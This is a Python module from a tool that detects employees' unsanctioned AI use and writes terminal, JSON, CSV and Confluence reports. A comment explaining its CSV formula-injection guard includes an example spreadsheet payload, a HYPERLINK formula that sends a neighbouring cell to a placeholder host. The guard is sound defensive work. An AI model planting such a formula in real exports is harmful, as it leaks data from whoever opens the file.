# Copyright 2026 Aman Karir
# SPDX-License-Identifier: Apache-2.0
# Part of Shadow AI Guard, https://github.com/AmanSK5/shadow-ai-guard

"""Report generator.

Takes findings from all scanner modules and produces unified output:
  - Terminal (rich tables)
  - JSON (machine-readable, for pipelines)
  - CSV (for evidence/compliance)
  - Confluence (wiki markup for Confluence pages)
"""

from __future__ import annotations

import json
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from ai_guard.scanners.base import Finding, ScanResult, occurrence_unit

# A cell a spreadsheet would run rather than display. csv handles commas and
# quotes; formulas are not a CSV concept, so it has no opinion about them.
# Excel, LibreOffice and Sheets all evaluate a cell beginning with one of
# these, and leading whitespace does not save you: the spreadsheet strips it
# and runs what is left. A device named =HYPERLINK("http://x/"&A1) exfiltrates
# the row beside it the moment somebody opens the export.
#
# Duplicated from portal/app/derive.py. The scanner and the portal are separate
# installables with nothing shared between them, and a helper this small is
# better copied than turned into a dependency.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value):
    """A cell a spreadsheet will display rather than evaluate.

    Prefixed with an apostrophe, which spreadsheets read as "what follows is
    text" and do not render. Strings only: the counts are integers and cannot
    carry a formula.
    """
    s = "" if value is None else str(value)
    if not s:
        return s
    return "'" + s if (s[0] in _FORMULA_LEAD
                       or s.lstrip("\t\r\n ").startswith(_FORMULA_LEAD)) else s



RISK_COLORS = {
    "high": "red",
    "medium": "yellow",
    "low": "green",
}

RISK_EMOJI = {
    "high": "[red]高[/red]",
    "medium": "[yellow]中[/yellow]",
    "low": "[green]低[/green]",
}


class ReportGenerator:
    def __init__(self, results: list[ScanResult], output_format: str = "terminal"):
        self.results = results
        self.output_format = output_format
        self.all_findings = self._collect_findings()

    def _collect_findings(self) -> list[Finding]:
        findings = []
        for result in self.results:
            findings.extend(result.findings)
        return findings

    def generate(self, output_path: Optional[str] = None) -> None:
        if self.output_format == "json":
            self._generate_json(output_path)
        elif self.output_format == "csv":
            self._generate_csv(output_path)
        elif self.output_format == "confluence":
            self._generate_confluence(output_path)
        else:
            self._generate_terminal()

    def _generate_terminal(self) -> None:
        console = Console()

        # Header
        console.print()
        console.print(
            Panel.fit(
                "[bold]AIミハル — 未把握のAI利用の検出レポート[/bold]\n"
                f"作成日時: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"実行した検出ソース: {len(self.results)} | "
                f"検出件数: {len(self.all_findings)}\n"
                "[dim]機密 — 従業員名と端末の識別情報を含みます[/dim]",
                border_style="blue",
            )
        )

        # Scanner status summary
        console.print("\n[bold]検出ソースの状態[/bold]")
        status_table = Table(show_header=True, header_style="bold")
        status_table.add_column("検出ソース")
        status_table.add_column("状態")
        status_table.add_column("検出件数")
        status_table.add_column("所要時間")

        for result in self.results:
            if result.skipped_reason:
                status = f"[dim]省略: {result.skipped_reason}[/dim]"
            elif result.errors:
                status = f"[red]エラー件数: {len(result.errors)}[/red]"
            else:
                status = "[green]正常[/green]"

            status_table.add_row(
                result.scanner_name,
                status,
                str(result.finding_count),
                f"{result.duration_seconds:.1f}秒",
            )

        console.print(status_table)

        if not self.all_findings:
            console.print("\n[green]AIツールの利用は検出されませんでした。検出ソースの状態も確認してください。[/green]\n")
            return

        # Findings by user
        console.print("\n[bold]利用者別の検出結果[/bold]")
        by_user = defaultdict(list)
        no_user = []
        for f in self.all_findings:
            if f.user_upn:
                by_user[f.user_upn].append(f)
            else:
                no_user.append(f)

        for upn in sorted(by_user.keys()):
            user_findings = by_user[upn]
            console.print(f"\n  [bold]{upn}[/bold]")

            for f in sorted(user_findings, key=lambda x: x.risk_tier, reverse=True):
                risk = RISK_EMOJI.get(f.risk_tier, f.risk_tier)
                line = f"    {risk} {f.service.name} — {f.detail}"
                if f.first_seen and f.last_seen:
                    start = f.first_seen.strftime("%Y年%m月")
                    end = f.last_seen.strftime("%Y年%m月")
                    line += f" ({start} — {end})" if start != end else f" ({start})"
                console.print(line)

        if no_user:
            console.print("\n  [bold]利用者を特定できない検出結果[/bold]")
            for f in no_user:
                risk = RISK_EMOJI.get(f.risk_tier, f.risk_tier)
                line = f"    {risk} {f.service.name} — {f.detail}"
                if f.first_seen and f.last_seen:
                    start = f.first_seen.strftime("%Y年%m月")
                    end = f.last_seen.strftime("%Y年%m月")
                    line += f" ({start} — {end})" if start != end else f" ({start})"
                console.print(line)

        # Findings by service
        console.print("\n[bold]ツール別の検出結果[/bold]")
        by_service = defaultdict(list)
        for f in self.all_findings:
            by_service[f.service.name].append(f)

        svc_table = Table(show_header=True, header_style="bold")
        svc_table.add_column("ツール")
        svc_table.add_column("提供元")
        svc_table.add_column("リスク")
        svc_table.add_column("利用者数")
        svc_table.add_column("端末数")
        svc_table.add_column("検出ソース")

        for svc_name in sorted(by_service.keys()):
            svc_findings = by_service[svc_name]
            first = svc_findings[0]
            users = set(f.user_upn for f in svc_findings if f.user_upn)
            endpoints = set(f.device_name for f in svc_findings if f.device_name)
            sources = set(f.source.value for f in svc_findings)
            risk_color = RISK_COLORS.get(first.risk_tier, "white")

            svc_table.add_row(
                svc_name,
                first.service.vendor,
                Text({"high": "高", "medium": "中", "low": "低"}.get(first.risk_tier, first.risk_tier), style=risk_color),
                str(len(users)) if users else "-",
                str(len(endpoints)) if endpoints else "-",
                ", ".join(sorted(sources)),
            )

        console.print(svc_table)
        console.print(
            "[dim]SentinelOneの結果は端末単位で重複を除いています。"
            "各行は利用者と端末の組合せを示し、イベント数ではありません。[/dim]"
        )

        # ─────────────────────────────────────────────
        # Actionable Summary
        # ─────────────────────────────────────────────
        console.print("\n[bold]対応が必要な項目[/bold]")

        # 1. Blocked tool violations
        blocked = [
            f for f in self.all_findings
            if f.user_upn and "[BLOCKED]" in f.detail
        ]
        if blocked:
            console.print("\n  [bold red]禁止ツールの利用[/bold red]")
            seen_blocked = set()
            for f in blocked:
                key = (f.user_upn, f.service.name)
                if key in seen_blocked:
                    continue
                seen_blocked.add(key)
                process = f.raw_evidence.get("process", "ブラウザー")
                console.print(
                    f"    [red]•[/red] [bold]{f.user_upn}[/bold] が "
                    f"{process}経由で[red]{f.service.name}[/red]を利用しています"
                )
            console.print(
                "    [dim]対応: 利用者に確認してください。これらのツールは"
                "組織の禁止リストに登録されています。[/dim]"
            )

        # 2. Bridge connections (non-browser processes hitting SaaS APIs)
        bridges = [
            f for f in self.all_findings
            if f.source.value == "sentinelone_bridge" and f.user_upn
        ]
        if bridges:
            console.print("\n  [bold yellow]SaaSへのアプリ経由の接続[/bold yellow]")
            seen_bridges = set()
            for f in bridges:
                process = f.raw_evidence.get("process_name", "不明")
                target = f.raw_evidence.get("bridge_target", f.service.name)
                key = (f.user_upn, process, target)
                if key in seen_bridges:
                    continue
                seen_bridges.add(key)
                console.print(
                    f"    [yellow]•[/yellow] [bold]{f.user_upn}[/bold] の "
                    f"[yellow]{process}[/yellow]が"
                    f"[bold]{target}[/bold]へ接続しています"
                )
            console.print(
                "    [dim]対応: ブラウザー以外のアプリがSaaSツールへ"
                "アクセスしています。APIキーやMCP連携の可能性があります。"
                "許可された利用か確認してください。[/dim]"
            )

        # 3. Shadow AI usage via desktop apps (not browsers)
        desktop_ai = [
            f for f in self.all_findings
            if f.source.value == "sentinelone_dns"
            and f.user_upn
            and "[BLOCKED]" not in f.detail
        ]
        # Filter to findings where process is an AI desktop app, not a browser
        ai_app_processes = {
            "claude", "claude.exe", "chatgpt", "chatgpt.exe",
            "copilot.exe", "copilot", "cursor", "cursor.exe",
            "windsurf", "windsurf.exe",
            "ollama", "ollama.exe",
            "code helper", "code helper (renderer)",
            "code", "code.exe",
        }
        desktop_ai_real = []
        for f in desktop_ai:
            process = (f.raw_evidence.get("process", "") or "").lower()
            if process in ai_app_processes:
                desktop_ai_real.append(f)

        if desktop_ai_real:
            console.print("\n  [bold]AIデスクトップアプリの利用[/bold]")
            seen_desktop = set()
            for f in desktop_ai_real:
                process = f.raw_evidence.get("process", "不明")
                key = (f.user_upn, f.service.name, process)
                if key in seen_desktop:
                    continue
                seen_desktop.add(key)
                console.print(
                    f"    • [bold]{f.user_upn}[/bold] が "
                    f"[bold]{process}[/bold]デスクトップアプリ経由で"
                    f"[bold]{f.service.name}[/bold]を利用しています"
                )
            console.print(
                "    [dim]対応: これらの利用者はAIデスクトップアプリを"
                "インストールし、APIを呼び出しています。"
                "組織のAI利用ポリシーに沿っているか確認してください。[/dim]"
            )

        if not blocked and not bridges and not desktop_ai_real:
            console.print("  [green]この集計で追加の対応項目はありません。[/green]")

        # Errors
        all_errors = [e for r in self.results for e in r.errors]
        if all_errors:
            console.print("\n[bold red]エラー[/bold red]")
            for error in all_errors:
                console.print(f"  [red]• {error}[/red]")

        console.print()

    def _generate_confluence(self, output_path: Optional[str] = None) -> None:
        lines: list[str] = []

        risk_markup = {
            "high": "{color:red}高{color}",
            "medium": "{color:#ff8b00}中{color}",
            "low": "{color:green}低{color}",
        }

        # Header
        lines.append("h1. AIミハル — 未把握のAI利用の検出レポート")
        lines.append("")
        lines.append(
            f"*作成日時:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | "
            f"*実行した検出ソース:* {len(self.results)} | "
            f"*検出件数:* {len(self.all_findings)}"
        )
        lines.append("_機密 — 従業員名と端末の識別情報を含みます_")
        lines.append("")

        # Scanner status table
        lines.append("h2. 検出ソースの状態")
        lines.append("|| 検出ソース || 状態 || 検出件数 || 所要時間 ||")
        for result in self.results:
            if result.skipped_reason:
                status = f"省略: {result.skipped_reason}"
            elif result.errors:
                status = f"{{color:red}}エラー件数: {len(result.errors)}{{color}}"
            else:
                status = "{color:green}正常{color}"
            lines.append(
                f"| {result.scanner_name} | {status} "
                f"| {result.finding_count} | {result.duration_seconds:.1f}秒 |"
            )
        lines.append("")

        if not self.all_findings:
            lines.append("{color:green}AIツールの利用は検出されませんでした。検出ソースの状態も確認してください。{color}")
            output = "\n".join(lines)
            if output_path:
                self._write_secure_file(output_path, output)
            else:
                print(output)
            return

        # Findings by user
        lines.append("h2. 利用者別の検出結果")
        by_user: dict[str, list[Finding]] = defaultdict(list)
        no_user: list[Finding] = []
        for f in self.all_findings:
            if f.user_upn:
                by_user[f.user_upn].append(f)
            else:
                no_user.append(f)

        for upn in sorted(by_user.keys()):
            user_findings = by_user[upn]
            lines.append(f"h3. {upn}")
            for f in sorted(user_findings, key=lambda x: x.risk_tier, reverse=True):
                risk = risk_markup.get(f.risk_tier, f.risk_tier)
                entry = f"* {risk} *{f.service.name}* — {f.detail}"
                if f.first_seen and f.last_seen:
                    start = f.first_seen.strftime("%Y年%m月")
                    end = f.last_seen.strftime("%Y年%m月")
                    entry += f" ({start} — {end})" if start != end else f" ({start})"
                lines.append(entry)

        if no_user:
            lines.append("h3. 利用者を特定できない検出結果")
            for f in no_user:
                risk = risk_markup.get(f.risk_tier, f.risk_tier)
                entry = f"* {risk} *{f.service.name}* — {f.detail}"
                if f.first_seen and f.last_seen:
                    start = f.first_seen.strftime("%Y年%m月")
                    end = f.last_seen.strftime("%Y年%m月")
                    entry += f" ({start} — {end})" if start != end else f" ({start})"
                lines.append(entry)

        lines.append("")

        # Findings by service table
        lines.append("h2. ツール別の検出結果")
        lines.append("|| ツール || 提供元 || リスク || 利用者数 || 端末数 || 検出ソース ||")

        by_service: dict[str, list[Finding]] = defaultdict(list)
        for f in self.all_findings:
            by_service[f.service.name].append(f)

        for svc_name in sorted(by_service.keys()):
            svc_findings = by_service[svc_name]
            first = svc_findings[0]
            users = set(f.user_upn for f in svc_findings if f.user_upn)
            endpoints = set(f.device_name for f in svc_findings if f.device_name)
            sources = set(f.source.value for f in svc_findings)
            risk = risk_markup.get(first.risk_tier, first.risk_tier.upper())
            lines.append(
                f"| {svc_name} | {first.service.vendor} | {risk} "
                f"| {len(users) if users else '-'} "
                f"| {len(endpoints) if endpoints else '-'} "
                f"| {', '.join(sorted(sources))} |"
            )

        lines.append("")
        lines.append(
            "_SentinelOneの結果は端末単位で重複を除いています。"
            "各行は利用者と端末の組合せを示し、イベント数ではありません。_"
        )
        lines.append("")

        # Action required
        lines.append("h2. 対応が必要な項目")

        action_sections: list[str] = []

        # Blocked tool violations
        blocked = [f for f in self.all_findings if f.user_upn and "[BLOCKED]" in f.detail]
        if blocked:
            section = ["{panel:title=禁止ツールの利用|borderColor=red}"]
            seen: set[tuple[str | None, str]] = set()
            for f in blocked:
                key = (f.user_upn, f.service.name)
                if key in seen:
                    continue
                seen.add(key)
                process = f.raw_evidence.get("process", "ブラウザー")
                section.append(
                    f"* {{color:red}}(!){{color}} *{f.user_upn}* が "
                    f"{process}経由で{{color:red}}{f.service.name}{{color}}を利用しています"
                )
            section.append("")
            section.append(
                "_対応: 利用者に確認してください。これらのツールは"
                "組織の禁止リストに登録されています。_"
            )
            section.append("{panel}")
            action_sections.append("\n".join(section))

        # Bridge connections
        bridges = [
            f for f in self.all_findings
            if f.source.value == "sentinelone_bridge" and f.user_upn
        ]
        if bridges:
            section = ["{panel:title=SaaSへのアプリ経由の接続|borderColor=#ff8b00}"]
            seen_bridges: set[tuple[str | None, str, str]] = set()
            for f in bridges:
                process = f.raw_evidence.get("process_name", "不明")
                target = f.raw_evidence.get("bridge_target", f.service.name)
                key = (f.user_upn, process, target)
                if key in seen_bridges:
                    continue
                seen_bridges.add(key)
                section.append(
                    f"* {{color:#ff8b00}}(!){{color}} *{f.user_upn}* の "
                    f"{{color:#ff8b00}}{process}{{color}}が*{target}*へ接続しています"
                )
            section.append("")
            section.append(
                "_対応: ブラウザー以外のアプリがSaaSツールへ"
                "アクセスしています。APIキーやMCP連携の可能性があります。"
                "許可された利用か確認してください。_"
            )
            section.append("{panel}")
            action_sections.append("\n".join(section))

        # Desktop AI apps
        desktop_ai = [
            f for f in self.all_findings
            if f.source.value == "sentinelone_dns"
            and f.user_upn
            and "[BLOCKED]" not in f.detail
        ]
        ai_app_processes = {
            "claude", "claude.exe", "chatgpt", "chatgpt.exe",
            "copilot.exe", "copilot", "cursor", "cursor.exe",
            "windsurf", "windsurf.exe",
            "ollama", "ollama.exe",
            "code helper", "code helper (renderer)",
            "code", "code.exe",
        }
        desktop_ai_real = [
            f for f in desktop_ai
            if (f.raw_evidence.get("process", "") or "").lower() in ai_app_processes
        ]
        if desktop_ai_real:
            section = ["{panel:title=AIデスクトップアプリの利用}"]
            seen_desktop: set[tuple[str | None, str, str]] = set()
            for f in desktop_ai_real:
                process = f.raw_evidence.get("process", "不明")
                key = (f.user_upn, f.service.name, process)
                if key in seen_desktop:
                    continue
                seen_desktop.add(key)
                section.append(
                    f"* *{f.user_upn}* が *{process}* デスクトップアプリ経由で"
                    f"*{f.service.name}* を利用しています"
                )
            section.append("")
            section.append(
                "_対応: これらの利用者はAIデスクトップアプリを"
                "インストールし、APIを呼び出しています。"
                "組織のAI利用ポリシーに沿っているか確認してください。_"
            )
            section.append("{panel}")
            action_sections.append("\n".join(section))

        if action_sections:
            lines.append("\n".join(action_sections))
        else:
            lines.append("{color:green}この集計で追加の対応項目はありません。{color}")

        lines.append("")

        # Errors
        all_errors = [e for r in self.results for e in r.errors]
        if all_errors:
            lines.append("h2. エラー")
            for error in self._sanitize_errors(all_errors):
                lines.append(f"* {{color:red}}{error}{{color}}")
            lines.append("")

        output = "\n".join(lines)
        if output_path:
            self._write_secure_file(output_path, output)
        else:
            print(output)

    def _generate_json(self, output_path: Optional[str] = None) -> None:
        data = {
            "classification": "CONFIDENTIAL — Contains employee names and device identifiers",
            "generated_at": datetime.now().isoformat(),
            "scanner_results": [
                {
                    "scanner": r.scanner_name,
                    "finding_count": r.finding_count,
                    "errors": self._sanitize_errors(r.errors),
                    "skipped": r.skipped_reason,
                    "duration_seconds": r.duration_seconds,
                }
                for r in self.results
            ],
            "note": "Each entry is one user/endpoint, not one per event. occurrence_count carries how many, in the unit named by occurrence_unit (sign-ins, devices, signup emails); it is 1 for sources that do not aggregate.",
            "findings": [
                {
                    "service": f.service.name,
                    "vendor": f.service.vendor,
                    "category": f.service.category,
                    "risk_tier": f.risk_tier,
                    "source": f.source.value,
                    "user_upn": f.user_upn,
                    "device_name": f.device_name,
                    "detail": f.detail,
                    "timestamp": f.timestamp.isoformat() if f.timestamp else None,
                    "occurrence_count": f.occurrence_count,
                    "occurrence_unit": occurrence_unit(f.source),
                    "first_seen": f.first_seen.isoformat() if f.first_seen else None,
                    "last_seen": f.last_seen.isoformat() if f.last_seen else None,
                }
                for f in self.all_findings
            ],
        }

        output = json.dumps(data, indent=2)
        if output_path:
            self._write_secure_file(output_path, output)
        else:
            print(output)

    def _generate_csv(self, output_path: Optional[str] = None) -> None:
        import csv
        import io

        headers = [
            "service", "vendor", "category", "risk_tier", "source",
            "user_upn", "device_name", "detail",
            "occurrence_count", "occurrence_unit",
            "first_seen", "last_seen",
        ]

        buffer = io.StringIO()
        writer = csv.DictWriter(buffer, fieldnames=headers)
        writer.writeheader()

        for f in self.all_findings:
            # Every string here is worth guarding, not only the obvious ones.
            # service, vendor and category come from the registry, which a
            # discovery MR can add to; user_upn, device_name and detail come
            # straight from a tenant. The counts and the timestamps are not
            # strings and cannot carry a formula.
            writer.writerow({
                "service": _csv_safe(f.service.name),
                "vendor": _csv_safe(f.service.vendor),
                "category": _csv_safe(f.service.category),
                "risk_tier": _csv_safe(f.risk_tier),
                "source": _csv_safe(f.source.value),
                "user_upn": _csv_safe(f.user_upn or ""),
                "device_name": _csv_safe(f.device_name or ""),
                "detail": _csv_safe(f.detail),
                "occurrence_count": f.occurrence_count,
                "occurrence_unit": occurrence_unit(f.source),
                "first_seen": f.first_seen.isoformat() if f.first_seen else "",
                "last_seen": f.last_seen.isoformat() if f.last_seen else "",
            })

        output = buffer.getvalue()
        if output_path:
            self._write_secure_file(output_path, output)
        else:
            print(output)

    @staticmethod
    def _write_secure_file(path: str, content: str) -> None:
        """Write output file with restricted permissions (owner-only)."""
        import stat
        with open(path, "w") as f:
            f.write(content)
        try:
            Path(path).chmod(stat.S_IRUSR | stat.S_IWUSR)
        except (OSError, AttributeError):
            pass

    @staticmethod
    def _sanitize_errors(errors: list[str]) -> list[str]:
        """Remove full API URLs from error messages to avoid leaking
        internal hostnames and instance identifiers in reports."""
        import re
        sanitized = []
        for error in errors:
            # Strip full URLs, keep just the status code and path
            cleaned = re.sub(
                r"https?://[^/]+(/[^\s'\"]*)",
                r"<redacted>\1",
                error,
            )
            sanitized.append(cleaned)
        return sanitized